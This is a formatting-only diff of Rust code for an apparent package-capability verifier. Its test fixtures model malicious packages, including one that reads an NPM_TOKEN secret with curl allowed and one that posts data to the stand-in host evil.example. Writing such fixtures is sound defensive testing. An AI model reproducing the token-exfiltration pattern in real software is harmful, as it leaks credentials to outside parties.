@@ -103,16 +103,11 @@ pub fn execute(
     // CallImport still resolves through the shared resolver, so a flow that
     // launders across packages is analyzed end-to-end.
     for module_id in program.modules.keys() {
-        verify_program(
-            &program.modules,
-            module_id,
-            policy,
-            |from, import_id| {
-                resolution
-                    .get(&(from.clone(), import_id))
-                    .map(|resolved| (resolved.module.clone(), resolved.function))
-            },
-        )
+        verify_program(&program.modules, module_id, policy, |from, import_id| {
+            resolution
+                .get(&(from.clone(), import_id))
+                .map(|resolved| (resolved.module.clone(), resolved.function))
+        })
         .map_err(|error| ExecError::Verify {
             module: module_id.clone(),
             error,
@@ -278,9 +273,12 @@ mod tests {
     #[test]
     fn env_read_package_runs_when_capability_granted() {
         let src = "module.exports = function readHome() { return process.env.HOME; };";
-        let module = compile(&src, &js_meta("read-home", "1.0.0", BehaviorType::HostCapability))
-            .unwrap()
-            .module;
+        let module = compile(
+            &src,
+            &js_meta("read-home", "1.0.0", BehaviorType::HostCapability),
+        )
+        .unwrap()
+        .module;
         let _ = CapabilityKind::EnvRead; // keep the import meaningful
 
         let policy = Policy::pure().allow_capability(Capability::EnvRead("HOME".to_owned()));
@@ -559,14 +557,7 @@ mod tests {
             .allow_capability(Capability::ProcSpawn("curl".to_owned()));
 
         let mut broker = MemoryBroker::new().with_env("NPM_TOKEN", "secret");
-        let err = execute(
-            units,
-            "npm:exfil-proc@1.0.0",
-            &policy,
-            &mut broker,
-            vec![],
-        )
-        .unwrap_err();
+        let err = execute(units, "npm:exfil-proc@1.0.0", &policy, &mut broker, vec![]).unwrap_err();
         match err {
             ExecError::Verify { error, .. } => assert!(
                 error
@@ -606,7 +597,10 @@ mod tests {
                     vec![
                         Op::LoadArg(0),
                         Op::Cap(CapOp::HttpRequest {
-                            request: HttpRequest::post("https://evil.example/p5adv", "evil.example"),
+                            request: HttpRequest::post(
+                                "https://evil.example/p5adv",
+                                "evil.example",
+                            ),
                         }),
                         Op::Pop,
                         Op::LoadArg(0),
